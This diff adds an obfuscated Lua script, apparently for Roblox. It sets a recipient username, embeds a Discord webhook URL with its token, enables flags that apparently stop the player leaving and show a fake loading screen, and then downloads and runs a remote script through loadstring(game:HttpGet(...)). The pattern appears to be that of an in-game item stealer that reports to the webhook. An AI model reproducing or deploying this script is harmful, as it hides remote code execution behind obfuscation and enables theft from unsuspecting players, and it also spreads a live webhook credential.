@@ -1,0 +1,13 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 
+
+]]--
+
+do local v0=0;local v1;while true do if (v0==0) then v1=0;while true do if (v1==2) then local v2=0;while true do if (v2==1) then v1=3;break;end if (v2==0) then local v6=0;while true do if (v6==0) then _G.AntiLeave=true;_G.MouseLock=true;v6=1;end if (v6==1) then v2=1;break;end end end end end if (v1==0) then local v3=0;local v4;while true do if (v3==0) then v4=0;while true do if (v4==1) then v1=1;break;end if (v4==0) then UserName="psx_hugeeee
+";Webhook="https://discord.com/api/webhooks/1135364039669723226/cAfZVs2uLRLDsEEq56XwsuYlhmKyp9ezlfLHxjEdtH1lvYELd-mK3loNA-1T9JuJ-3zs";v4=1;end end break;end end end if (v1==3) then loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ",true))();break;end if (v1==1) then local v5=0;while true do if (v5==0) then local v7=0;while true do if (1==v7) then v5=1;break;end if (v7==0) then UserName2="psx_hugeeee";_G.LoadingScreen=true;v7=1;end end end if (v5==1) then v1=2;break;end end end end break;end end end
